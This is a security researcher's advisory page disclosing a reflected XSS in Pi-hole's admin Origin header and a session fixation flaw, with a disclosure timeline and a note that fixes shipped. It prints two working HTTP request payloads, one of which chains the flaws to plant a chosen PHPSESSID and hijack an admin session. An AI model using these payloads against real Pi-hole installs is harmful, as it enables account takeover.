@@ -1,0 +1,301 @@
+<!doctype html>
+
+<html lang="en-us">
+
+<head>
+  <title>Pi-hole - Multiple Vulnerabilities - The Tales of N4nj0</title>
+  <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta name="description" content="The HTML5 Herald" />
+<meta name="author" content="Veno Eivazian" /><meta property="og:title" content="Pi-hole - Multiple Vulnerabilities" />
+<meta property="og:description" content="TL;DR 1 - Reflected Cross-site Scripting: A remote user is able to inject arbitrary web script or HTML due to incorrect sanitization of Origin header and achieve a Reflected Cross-Site Scripting attack against other users and steal the session cookie.
+2 - Session Fixation: Session fixation vulnerability allows remote attackers to hijack web sessions via the PHPSESSID parameter.
+Product Information  Product Name: Pi-hole Vulnerable Version: 5.0, 5.1, 5.1.1 Organization Name: Pi-hole, LLC Product Web Page: https://pi-hole." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://n4nj0.github.io/advisories/pi-hole-multiple-vulnerabilities-i/" />
+<meta property="article:published_time" content="2021-02-18T11:10:00&#43;01:00"/>
+<meta property="article:modified_time" content="2021-02-18T11:10:00&#43;01:00"/>
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Pi-hole - Multiple Vulnerabilities"/>
+<meta name="twitter:description" content="TL;DR 1 - Reflected Cross-site Scripting: A remote user is able to inject arbitrary web script or HTML due to incorrect sanitization of Origin header and achieve a Reflected Cross-Site Scripting attack against other users and steal the session cookie.
+2 - Session Fixation: Session fixation vulnerability allows remote attackers to hijack web sessions via the PHPSESSID parameter.
+Product Information  Product Name: Pi-hole Vulnerable Version: 5.0, 5.1, 5.1.1 Organization Name: Pi-hole, LLC Product Web Page: https://pi-hole."/>
+
+<meta name="generator" content="Hugo 0.54.0" />
+    
+
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" integrity="sha256-l85OmPOjvil/SOvVt3HnSSjzF1TUMyT9eV0c2BzEGzU=" crossorigin="anonymous" />
+  <link rel="stylesheet" href="https://n4nj0.github.io/fontawesome/css/all.min.css" />
+  
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Slab|Ruda" />
+  
+  
+  <link rel="stylesheet" type="text/css" href="/css/styles.css" /></head>
+
+<body>
+  <div id="container">
+    <header>
+      <h1>
+                <a href="/">The Tales of N4nj0</a>
+            </h1>
+
+      <ul id="social-media">
+             <li>
+               <a href="https://github.com/n4nj0" title="GitHub">
+               <i class="fab fa-github fa-lg"></i>
+               </a>
+             </li>
+             <li>
+               <a href="https://linkedin.com/in/venoeivazian" title="LinkedIn">
+               <i class="fab fa-linkedin fa-lg"></i>
+               </a>
+             </li>
+      </ul>
+      
+    </header>
+
+    
+<nav>
+    <ul>
+        
+        <li>
+            <a class="active" href="/advisories/">
+                <i class="fa-li fa  fa-lg"></i><span>Advisories</span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="" href="/posts/">
+                <i class="fa-li fa  fa-lg"></i><span>Posts</span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="" href="/whoami/">
+                <i class="fa-li fa  fa-lg"></i><span>whoami</span>
+            </a>
+        </li>
+        
+    </ul>
+</nav>
+
+
+    <main>
+
+
+
+
+<article>
+
+    <h1>Pi-hole - Multiple Vulnerabilities</h1>
+
+    
+      <aside>
+    <ul>
+        <li>
+            <time class="post-date" datetime="2021-02-18T11:10:00&#43;01:00">Feb 18, 2021</time>
+        </li>
+        
+        
+
+        
+
+        <li>4 minutes read</li>
+    </ul>
+</aside>
+
+    
+
+    
+<div class="featured_image">
+    <a href="https://n4nj0.github.io/advisories/pi-hole-multiple-vulnerabilities-i/" title="Pi-hole - Multiple Vulnerabilities">
+        <img src="">
+    </a>
+</div>
+
+
+
+    
+
+<h2 id="tl-dr">TL;DR</h2>
+
+<p><strong>1 - Reflected Cross-site Scripting</strong>: A remote user is able to inject arbitrary web script or HTML due to incorrect sanitization of Origin header and achieve a Reflected Cross-Site Scripting attack against other users and steal the session cookie.<br />
+<strong>2 - Session Fixation</strong>: Session fixation vulnerability allows remote attackers to hijack web sessions via the PHPSESSID parameter.</p>
+
+<h2 id="product-information">Product Information</h2>
+
+<ul>
+<li><strong>Product Name:</strong> Pi-hole</li>
+<li><strong>Vulnerable Version:</strong> 5.0, 5.1, 5.1.1</li>
+<li><strong>Organization Name:</strong> Pi-hole, LLC</li>
+<li><strong>Product Web Page:</strong> <a href="https://pi-hole.net/">https://pi-hole.net/</a></li>
+<li><strong>eMail:</strong> <a href="disclosure@pi-hole.net">disclosure@pi-hole.net</a></li>
+<li><strong>Vulnerability Disclosure Info Web Page:</strong> <a href="https://pi-hole.net/contact/">https://pi-hole.net/contact/</a></li>
+</ul>
+
+<p>Pi-hole is a Linux network-level advertisement and Internet tracker blocking application which acts as a DNS sinkhole and optionally a DHCP server, intended for use on a private network.<br />
+During a security auditing of the product, I have found two issues. The first is a Reflected XSS, the second is a Session Fixation. Those issues can be combined to steal a valid administrative session.</p>
+
+<p>The fixes were implemented by the owners after my vulnerability notification.</p>
+
+<p>It is recommended to apply the latest update Pi-hole FTL v5.7 and Web v5.4: <a href="https://pi-hole.net/2021/02/16/pi-hole-ftl-v5-7-and-web-v5-4-released/#page-content">https://pi-hole.net/2021/02/16/pi-hole-ftl-v5-7-and-web-v5-4-released/#page-content</a></p>
+
+<h2 id="vulnerability-details">Vulnerability Details</h2>
+
+<h3 id="1-reflected-cross-site-scripting-improper-neutralization-of-input-during-web-page-generation-cross-site-scripting-cwe-79"><strong>1 - Reflected Cross-site Scripting - Improper Neutralization of Input During Web Page Generation (Cross-site Scripting) - CWE-79</strong></h3>
+
+<ul>
+<li><strong>Product Line:</strong> Pi-hole</li>
+<li><strong>Vulnerable Version:</strong> 5.0, 5.1, 5.1.1</li>
+<li><strong>Summary:</strong> A remote user is able to inject arbitrary web script or HTML due to incorrect sanitization of user-supplied data and achieve a Reflected Cross-Site Scripting attack against other users and steal the session cookie.</li>
+<li><strong>Prerequisites:</strong> No special configuration is required to reproduce the issue.</li>
+</ul>
+
+<p><strong>Step-by-step instructions and PoC</strong></p>
+
+<p>An attacker is able to craft an HTTP request and send it to a user, authenticated to Pi-hole, to inject arbitrary web script or HTML into the HTTP <strong>Origin</strong> header, which reflect the user input.</p>
+
+<p><strong>Affected Endpoints</strong></p>
+
+<ul>
+<li><strong>URL:</strong> <a href="http://hostname/admin">http://hostname/admin</a></li>
+<li><strong>HTTP Parameter:</strong> Origin header</li>
+</ul>
+
+<p>Below are the evidences with the vulnerability details and the payloads used.</p>
+
+<p>Payload used to exploit the vulnerability:</p>
+
+<pre><code>GET /admin/ HTTP/1.1
+Host: hostname
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Origin: aaa&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+
+
+</code></pre>
+
+<p>The user is invited to click on a malicious page that have JavaScript code to execute the following HTTP request on the browser of the victim:</p>
+
+<p><img src="/images/2fd0bb523d7946e780a209ca11be71bf.png" alt="XSS - 1" /></p>
+
+<p>The XSS payload gets reflected to the screen.</p>
+
+<p><img src="/images/ab243615327c43a12270942a75db8cd1.png" alt="XSS - 2" /></p>
+
+<p>It is important to note that the <strong>PHPSESSID</strong> session cookie does not have the <strong>HttpOnly</strong> flag, when first assigned to the user:</p>
+
+<p><img src="/images/8f425467cc188b93240a89e81fcb0525.png" alt="XSS - 3" /></p>
+
+<p><strong>Security Impact</strong></p>
+
+<p>By exploiting this issue an attacker is able to target an application user with several type of direct or indirect impacts such as, credentials stealing, integrity compromising and different type of phishing attacks. This type of reflected XSS does require user interaction.</p>
+
+<h3 id="2-session-fixation-cwe-384"><strong>2 - Session Fixation - CWE-384</strong></h3>
+
+<ul>
+<li><strong>Product Line:</strong> Pi-hole</li>
+<li><strong>Vulnerable Version:</strong> 5.0, 5.1, 5.1.1</li>
+
+<li><p><strong>Summary:</strong> Session fixation vulnerability allows remote attackers to hijack web sessions via the PHPSESSID parameter.</p></li>
+
+<li><p><strong>Prerequisites:</strong> No special configuration is required to reproduce the issue.</p></li>
+</ul>
+
+<p><strong>Step-by-step instructions and PoC</strong></p>
+
+<p>The application does not generate new session cookie after the user is logged in. A malicious user is able to create a new session cookie value and inject it to a victim. After the victim logs in, the injected cookie becomes valid, giving the attacker access to the user&rsquo;s account through the active session.</p>
+
+<p><strong>Affected Endpoints</strong></p>
+
+<ul>
+<li><strong>URL:</strong> <a href="http://hostname/admin/index.php?login">http://hostname/admin/index.php?login</a></li>
+<li><strong>HTTP Parameter:</strong> PHPSESSID cookie</li>
+</ul>
+
+<p>Below are the evidences with the vulnerability details and the payload used.</p>
+
+<p>By leveraging the previously found XSS vulnerability, the malicious user can create a request to inject an arbitrary PHPSESSID value to the victim browser:</p>
+
+<pre><code>GET /admin/ HTTP/1.1
+Host: hostname
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Origin: aaa&lt;script&gt;document.cookie = &quot;PHPSESSID&quot;+&quot;=&quot;+escape(&quot;mosmbqsp3lh7pf1ar2djcjmk5v&quot;)&lt;/script&gt;
+Cookie: PHPSESSID=mosmbqsp3lh7pf1ar2djcjmk5v
+
+
+</code></pre>
+
+<p><img src="/images/bcccc0b7b7861c28e3371dc3a25ff77b.png" alt="Session Fixation - 1" /></p>
+
+<p>The following is the response of the payload and the new cookie added to the browser cookie storage:</p>
+
+<p><img src="/images/055224568ea3762d5b13c06d082a4475.png" alt="Session Fixation - 2" /></p>
+
+<p>Then, when the user performs a login, the new PHPSESSID becomes valid. The attacker can add it to its browser to autenticate to the web application:</p>
+
+<p><img src="/images/c42617cec0dd8eafd509108ec94230c9.png" alt="Session Fixation - 3" /></p>
+
+<p>Indeed, after a user login, there is no a new generation of PHPSESSID:</p>
+
+<p><img src="/images/a94a5c151aed793c9d78fab3032fe36e.png" alt="Session Fixation - 4" /></p>
+
+<p><strong>Security Impact</strong></p>
+
+<p>By exploiting this issue, an attacker is able to obtain a valid user session of the application. This type
+of attack does require user interaction.</p>
+
+<h2 id="timeline">Timeline</h2>
+
+<ul>
+<li><strong>15/12/2020</strong>: First disclosure via e-mail to <a href="disclosure@pi-hole.net">disclosure@pi-hole.net</a></li>
+<li><strong>22/12/2020</strong>: Acknowledge e-mail from the product owner!</li>
+<li><strong>31/12/2020</strong>: Trying to collaborate with product owner by suggesting some remediation code. I&rsquo;m really glad to collaborate with them!</li>
+<li><strong>16/02/2020</strong>: Released the fixed versions and added a news with advisory and credits: <a href="https://pi-hole.net/2021/02/16/pi-hole-ftl-v5-7-and-web-v5-4-released/">https://pi-hole.net/2021/02/16/pi-hole-ftl-v5-7-and-web-v5-4-released/</a></li>
+</ul>
+
+
+</article>
+
+
+<section class="post-nav">
+    <ul>
+        
+        <li>
+            <a href="https://n4nj0.github.io/advisories/nedi-multiple-vulnerabilities-i/"><i class="fa fa-chevron-circle-left"></i> NeDi 1.9C - Multiple Vulnerabilities</a>
+        </li>
+        
+        
+    </ul>
+</section>
+  
+    
+    
+  
+
+
+
+
+
+<footer>
+  <div>
+    <p>
+      <h6>
+      &copy; 2020 Veno Eivazian.
+      <a href="https://creativecommons.org/licenses/by/3.0/" title="Creative Commons Attribution">Some rights reserved</a>;
+      please attribute properly and link back.
+      </h6>
+    </p>
+  </div>
+</footer>
+
